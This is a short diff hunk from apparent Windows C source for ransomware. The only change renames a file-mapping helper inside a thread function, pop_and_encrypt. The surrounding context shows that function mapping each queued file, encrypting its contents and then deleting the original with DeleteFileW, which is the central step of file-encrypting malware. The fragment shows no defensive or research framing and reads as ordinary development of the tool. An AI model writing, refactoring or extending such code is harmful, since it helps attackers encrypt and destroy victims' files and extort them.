@@ -61,7 +61,7 @@ DWORD WINAPI pop_and_encrypt(LPVOID param) {
         sync_unlock_mutex();
         LPVOID p_src, p_dst;
         DWORD file_size;
-        create_file_mappings(file_path, &file_size, &p_src, &p_dst);
+        fu_create_file_mappings(file_path, &file_size, &p_src, &p_dst);
         encrypt_data(p_src, p_dst, file_size);
         DeleteFileW(file_path);
         free(file_path);
